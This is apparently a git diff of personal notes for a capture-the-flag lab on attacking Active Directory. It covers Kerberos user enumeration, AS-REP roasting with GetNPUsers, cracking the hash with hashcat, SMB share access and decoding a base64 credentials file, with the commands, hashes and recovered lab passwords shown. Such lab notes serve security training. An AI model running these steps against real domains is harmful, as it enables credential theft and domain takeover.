@@ -1,3 +1,4 @@
+#Task 2 Intro Setup 
 sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
 sudo pip3 install -r /opt/impacket/requirements.txt
 cd /opt/impacket/ 
@@ -6,12 +7,166 @@ sudo python3 setup.py install
 
 apt install bloodhound neo4j
 
-locate GetNPUsers.py
+#Task 3 Enumeration Welcome to Attacktive Directory 
+- What tool will allow us to enumerate port 139/445?
+enum4linux
+
+- What is the NetBIOS-Domain Name of the machine?
+hint: nmap -sSVC -Pn -vv $IP
+THM-AD
+
+
+- What invalid TLD do people commonly use for their Active Directory Domain?
+.local
+
+#Task 4 Enumeration Enumerating Users via Kerberos 
+https://github.com/ropnop/kerbrute/releases
+save:
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+on my machine
+vi /etc/hosts
+###
+10.10.186.100 spookysec.local
+####
+
+
+- What command within Kerbrute will allow us to enumerate valid usernames?
+hint: ./kerbrute -h
+userenum
+
+
+- What notable account is discovered? (These should jump out at you)
+hint: ./kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/spooky/userlist.txt -t 100
+2021/07/25 09:53:07 >  [+] VALID USERNAME:       james@spookysec.local
+2021/07/25 09:53:10 >  [+] VALID USERNAME:       svc-admin@spookysec.local
+2021/07/25 09:53:12 >  [+] VALID USERNAME:       James@spookysec.local
+2021/07/25 09:53:14 >  [+] VALID USERNAME:       robin@spookysec.local
+2021/07/25 09:53:28 >  [+] VALID USERNAME:       darkstar@spookysec.local
+2021/07/25 09:53:33 >  [+] VALID USERNAME:       administrator@spookysec.local
+2021/07/25 09:53:45 >  [+] VALID USERNAME:       backup@spookysec.local
+2021/07/25 09:53:54 >  [+] VALID USERNAME:       paradox@spookysec.local
+2021/07/25 09:54:45 >  [+] VALID USERNAME:       JAMES@spookysec.local
+2021/07/25 09:54:56 >  [+] VALID USERNAME:       Robin@spookysec.local
+2021/07/25 09:55:56 >  [+] VALID USERNAME:       Administrator@spookysec.local
+2021/07/25 09:58:38 >  [+] VALID USERNAME:       Darkstar@spookysec.local
+2021/07/25 09:59:36 >  [+] VALID USERNAME:       Paradox@spookysec.local
+2021/07/25 10:03:39 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
+2021/07/25 10:05:13 >  [+] VALID USERNAME:       ori@spookysec.local
+2021/07/25 10:06:25 >  [+] VALID USERNAME:       ROBIN@spookysec.local
+
+svc-admin
+
+- What is the other notable account is discovered? (These should jump out at you)
+backup
+
+
+#Task 5 Exploitation Abusing Kerberos
+- We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
+hint: locate GetNPUsers.py
 /usr/share/doc/python3-impacket/examples/GetNPUsers.py
+GetNPUsers.py -dc-ip 10.10.186.100 spookysec.local/svc-admin -no-pass
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:925331e8ffd8f49bfb71ee45c8483950$232c5a5d482464775019cf1edc27cffcc9d0dfe3ce6857621230748fdb321747184f8520beb67fb6f46ef990d4e520e562f5ff499ca9452f66478e6db17cff726fe066d70531192242c24096b968709e25a4a4a901fe088d284c3b2bc9e5c1ef684113ae3273fe3e5e269f81f4d4f50cfadb9436a6eee5b1a0822fbe70e20f5e50eee29b307a846548d4a47573ea8d510cd76f6adb26d38579b3051634052ce4a2c121a898460b87ca51f0ffa26744e7cc4f9c0e31395c1660f5c38dbb66dcde6a806e1347ea5c996e927f94da5dd738fc1ad25797ee3fbc70836970065cc7d36e396d08a43935589f3307eec4ecf3879d38
+svc-admin
 
 
 
-hashcat -m 7500 -a0 --force -o kerbe.txt /home/gd/Downloads/rockyou.txt
+
+- Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
+hint: hashcat --help | grep Kerberos
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
+  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
+  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
+  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
+  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
+  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
+  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
+
+Kerberos 5, etype 23, AS-REP
+
+
+- What mode is the hash?
+18200
+
+
+- Now crack the hash with the modified password list provided, what is the user accounts password?
+hint:
+vi tocrack.txt
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:925331e8ffd8f49bfb71ee45c8483950$232c5a5d482464775019cf1edc27cffcc9d0dfe3ce6857621230748fdb321747184f8520beb67fb6f46ef990d4e520e562f5ff499ca9452f66478e6db17cff726fe066d70531192242c24096b968709e25a4a4a901fe088d284c3b2bc9e5c1ef684113ae3273fe3e5e269f81f4d4f50cfadb9436a6eee5b1a0822fbe70e20f5e50eee29b307a846548d4a47573ea8d510cd76f6adb26d38579b3051634052ce4a2c121a898460b87ca51f0ffa26744e7cc4f9c0e31395c1660f5c38dbb66dcde6a806e1347ea5c996e927f94da5dd738fc1ad25797ee3fbc70836970065cc7d36e396d08a43935589f3307eec4ecf3879d38
+
+hashcat -m 18200 -a 0 tocrack.txt /home/gd/Download/rockyou.txt --force
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:925331e8ffd8f49bfb71ee45c8483950$232c5a5d482464775019cf1edc27cffcc9d0dfe3ce6857621230748fdb321747184f8520beb67fb6f46ef990d4e520e562f5ff499ca9452f66478e6db17cff726fe066d70531192242c24096b968709e25a4a4a901fe088d284c3b2bc9e5c1ef684113ae3273fe3e5e269f81f4d4f50cfadb9436a6eee5b1a0822fbe70e20f5e50eee29b307a846548d4a47573ea8d510cd76f6adb26d38579b3051634052ce4a2c121a898460b87ca51f0ffa26744e7cc4f9c0e31395c1660f5c38dbb66dcde6a806e1347ea5c996e927f94da5dd738fc1ad25797ee3fbc70836970065cc7d36e396d08a43935589f3307eec4ecf3879d38:management2005
+management2005
+
+#Task 6 Enumeration Back to the Basics 
+- What utility can we use to map remote SMB shares?
+hint: smbclient or smbmap
+
+
+- Which option will list shares?
+hint: smbclient --help | grep list
+-L
+
+
+- How many remote shares is the server listing?
+hint: 
+smbclient -L 10.10.186.100 -U 'svc-admin' 
+Enter WORKGROUP\svc-admin's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backup          Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+
+####
+smbmap -H spookysec.local -u svc-admin -p management2005 -d spookysec.local                
+[+] IP: spookysec.local:445     Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        backup                                                  READ ONLY
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+#####
+6
+
+
+- There is one particular share that we have access to that contains a text file. Which share is it?
+backup
+
+
+
+- What is the content of the file?
+hint: smbclient \\\\10.10.186.100\\backup -U 'svc-admin'
+smbclient>dir
+backup_credentials.txt 
+more backup_credentials.txt
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+
+
+- Decoding the contents of the file, what is the full contents?
+hint: vi decode.txt
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+
+base64 --decode decode.txt
+backup@spookysec.local:backup2517860 
+
+
+
+
+#Task 7 Domain Privilege Escalation Elevating Privileges within the Domain 
+- What method allowed us to dump NTDS.DIT?
+hint: secretsdump.py --help
+DRSUAPI
+
+
 
 https://floreaiulianpfa.com/attacktive-directory-try-hack-me/
 https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
